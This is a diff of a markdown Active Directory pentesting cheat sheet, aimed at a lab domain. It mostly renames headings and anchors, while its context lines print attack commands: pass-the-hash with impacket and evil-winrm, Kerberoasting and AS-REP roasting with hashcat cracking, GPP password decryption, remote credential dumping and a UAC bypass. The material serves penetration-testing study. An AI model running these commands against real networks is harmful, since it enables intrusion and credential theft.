@@ -10,28 +10,27 @@ tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB
 
 - [Identifying the Domain Controller](#identifying-the-domain-controller)
 - [Uncredentialed Enumeration and Attacks](#uncredentialed-enumeration-and-attacks)
-- [Domain Password Policy](#domain-password-policy-enumeration)
-- [Domain and Local User](#domain-and-local-user-enumeration)
-- [Domain and Local Group](#domain-and-local-group-enumeration)
-- [SMB Shares Credentialed](#smb-shares-credentialed-access-and-enumeration)
-- [RPC Credentialed](#rpc-credentialed-access-and-enumeration)
+- [Domain Password Policy](#domain-password-policy)
+- [Domain and Local User](#domain-and-local-user)
+- [Domain and Local Group](#domain-and-local-group)
+- [SMB Shares Credentialed](#smb-shares-credentialed)
+- [RPC Credentialed](#rpc-credentialed)
 - [GPP cpassword](#gpp-cpassword)
-- [Password Spraying](#password-spraying-with-kerbrute-netexec-and-crackmapexec)
+- [Password Spraying](#password-spraying)
 - [Runas and RunasCs.exe](#runas-and-runascsexe)
-- [BloodHound](#bloodhound-sharphoundexe-bloodhound-python)
+- [BloodHound](#bloodhound)
 - [PowerView.ps1](#powerviewps1)
-- [Impacket PsExec, WmiExec and SMBExec](#impacket-psexec-wmiexec-and-smbexec---smb-shell-access-with-password-or-pass-the-hash)
-- [Evil-WinRM](#evil-winrm---winrm-access-winrm-with-password-or-pass-the-hash)
-- [xfreerdp](#xfreerdp---rdp-access-with-password-or-pass-the-hash)
-- [Kerberoasting with Impacket-GetUserSPNs](#kerberoasting-with-impacket-getuserspns)
-- [Kerberoasting with Rubeus.exe](#kerberoasting-with-rubeusexe)
-- [AS-REP Roasting](#as-rep-roasting-with-impacket-getnpusers)
-- [DCSync](#dcsync-with-impacket-secretsdump)
-- [Remote Credential Dumping](#remote-credential-dumping-with-impacket-secretsdump-and-netexec)
-- [Local Credential Dumping](#local-credential-dumping-with-mimikatz-and-impacket-secretsdump)
+- [Impacket PsExec, WmiExec and SMBExec](#impacket-psexec-wmiexec-and-smbexec)
+- [Evil-WinRM](#evil-winrm)
+- [xfreerdp](#xfreerdph)
+- [Kerberoasting](#kerberoasting)
+- [AS-REP Roasting](#as-rep-roasting)
+- [DCSync](#dcsync)
+- [Remote Credential Dumping](#remote-credential-dumping)
+- [Local Credential Dumping](#local-credential-dumping)
 - [Silver Ticket](#silver-ticket)
 - [ACLs](#acls)
-- [MSSQL](#mssql-to-gain-shell-access)
+- [MSSQL](#mssql)
 
 ### Identifying the Domain Controller
 ```shell
@@ -111,7 +110,7 @@ impacket-rpcdump -port 135 vorkharium.com/'':''@172.16.150.10
 enum4linux -U 172.16.150.10
 
 ```
-### Domain Password Policy Enumeration
+### Domain Password Policy
 ```shell
 # NetExec and CrackMapExec
 nxc smb 172.16.150.10 -u 'Vivi' -p 'Thundaga2000' --pass-pol
@@ -130,7 +129,7 @@ Get-ADDefaultDomainPasswordPolicy
 (Get-ADDomain).DefaultPasswordPolicy
 Get-WmiObject -Class Win32_NetworkLoginProfile | Select-Object -Property Name, PasswordExpirationDate
 ```
-### Domain and Local User Enumeration
+### Domain and Local User
 ```shell
 # NetExec and CrackMapExec
 nxc smb 172.16.150.10 -u john -p 'Password123!' --users
@@ -160,7 +159,7 @@ Get-ADUser -Filter * -Property SamAccountName
 Get-ADUser -Filter * -Server 172.16.150.10 -Property SamAccountName
 
 ```
-### Domain and Local Group Enumeration
+### Domain and Local Group
 ```shell
 # NetExec and CrackMapExec
 nxc smb 172.16.150.10 -u john -p 'Password123!' --groups
@@ -189,7 +188,7 @@ Get-WmiObject -Class Win32_Group -ComputerName 172.16.150.10
 Get-LocalGroup
 Get-LocalGroupMember -Group "Administrators"
 ```
-### SMB Shares Credentialed Access and Enumeration
+### SMB Shares Credentialed
 ```shell
 # Enumeration
 # NetExec and CrackMapExec
@@ -210,7 +209,7 @@ smbclient //172.16.150.10/Public -U john
 impacket-smbclient vorkharium.com/john:'Password123!'@172.16.150.10
 
 ```
-### RPC Credentialed Access and Enumeration
+### RPC Credentialed
 ```shell
 # With Password
 rpcclient -U "username%password" 172.16.150.10
@@ -242,7 +241,7 @@ sudo apt install gpp-decrypt
 gpp-decrypt F7HV9AXdOSpNAXTDhwZt0atMg6S/Q0TOnyGDYMIzL7o ​
 # This will give us the credentials for the user the Groups.xml is related to
 ```
-### Password Spraying with Kerbrute, NetExec and CrackMapExec
+### Password Spraying
 ```shell
 # kerbrute.py
 git clone https://github.com/TarlogicSecurity/kerbrute.git
@@ -337,7 +336,7 @@ runas /netonly /user:vorkharium.com\john cmd
 # Using RunasCs.exe with pwnednewuser (pwnednewuser is a new user with admin rights we added before through an exploit)
 ./RunasCs.exe pwnednewuser 'password123!' "cmd /c type C:\Users\Administrator\Desktop\root.txt" --bypass-uac --logon-type '8' --force-profile
 ```
-### BloodHound, SharpHound.exe, bloodhound-python
+### BloodHound
 ```shell
 # BloodHound Collectors
 # SharpHound v1.1.1 (Use version 1.1.1, otherwise SharpHound.exe results won't work and BloodHound will appear empty after loading them)
@@ -384,7 +383,7 @@ Get-DomainUser -SPN -Domain vorkharium.com -Credential $Cred | select SamAccount
 ```
 For a complete and detailed list of all PowerView.ps1 commands check the following link:
 https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
-### Impacket PsExec, WmiExec and SMBExec - SMB Shell Access with Password or Pass-the-Hash
+### Impacket PsExec, WmiExec and SMBExec
 ```shell
 # Using Password
 # impacket-psexec with password
@@ -412,7 +411,7 @@ impacket-wmiexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b424887
 impacket-smbexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
 impacket-smbexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
 ```
-### Evil-WinRM - WinRM Access with Password or Pass-the-Hash
+### Evil-WinRM
 ```shell
 # With Password
 evil-winrm -i 172.16.150.10 -u Administrator -p 'Password123!'
@@ -420,7 +419,7 @@ evil-winrm -i 172.16.150.10 -u Administrator -p 'Password123!'
 # With Hash
 evil-winrm -i 172.16.150.10 -u Administrator -H 1a06b4248879e68a498d3bac51bf91c9
 ```
-### xfreerdp - RDP Access with Password or Pass-the-Hash
+### xfreerdp
 ```shell
 # Create "/home/kali/share" before using it - This folder will allow us to move files easily from inside the xfreerdp session
 
@@ -433,17 +432,12 @@ xfreerdp /cert-ignore /auto-reconnect /h:1000 /w:1600 /v:172.16.150.10 /u:Admini
 # Using hash
 xfreerdp /u:Administrator /pth:'1a06b4248879e68a498d3bac51bf91c9' /v:172.16.150.10 /drive:share,/home/kali/share
 ```
-### Kerberoasting with Impacket-GetUserSPNs
+### Kerberoasting
 ```shell
-# Using john to obtain the hash of jane
+# Kerberoasting from Kali using Impacket-GetUserSPNs
 impacket-GetUserSPNs -dc-ip 172.16.150.10 vorkharium.com/john -request-user jane
 
-# Cracking the hash
-hashcat -m 13100 jane_hash.txt /usr/share/wordlists/rockyou.txt
-```
-### Kerberoasting with Rubeus.exe
-```shell
-# Using john to obtain the hash of jane
+# Kerberoasting from Windows Host using Rubeus.exe
 ./Rubeus.exe kerberoast /domain:vorkharium.com /user:jane /creduser:vorkharium.com\john /credpassword:'Password123!' /nowrap
 
 # Cracking the hash
@@ -451,12 +445,11 @@ hashcat -m 13100 jane_hash.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 13100 jane_hash.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 13100 -a 0 -o cracked_jane_hash.txt jane_hash.txt /usr/share/wordlists/rockyou.txt
 
-# With John
+# With Johntheripper
 sudo john --wordlist=/usr/share/wordlists/rockyou.txt jane_hash.txt
 sudo john jane_hash.txt --show
-
 ```
-### AS-REP Roasting with Impacket-GetNPUsers
+### AS-REP Roasting
 ```shell
 # AS-REP Roasting without password
 impacket-GetNPUsers vorkharium.com/john -dc-ip 172.16.150.10 -request -no-pass
@@ -473,10 +466,10 @@ hashcat -m 18200 -a 0 -o cracked_jane_hash.txt jane_hash.txt /usr/share/wordlist
 sudo john --wordlist=/usr/share/wordlists/rockyou.txt jane_hash.txt
 sudo john jane_hash.txt --show
 ```
-### DCSync with Impacket-secretsdump
+### DCSync
 ```shell
 ```
-### Remote Credential Dumping with Impacket-secretsdump and NetExec
+### Remote Credential Dumping
 ```shell
 # Using Impacket
 # With password
@@ -512,7 +505,7 @@ nxc smb 172.16.150.20 -u john -p 'Password123!' -M procdump
 # LAPS Password
 nxc ldap 172.16.150.20 -u john -p 'Password123!' -M laps -o computer=172.16.150.120
 ```
-### Local Credential Dumping with Mimikatz and Impacket-secretsdump
+### Local Credential Dumping
 ```shell
 # Mimikatz.exe
 # Important Note: mimikatz.exe wont work from the evil-winrm console. Use nc to get shell instead
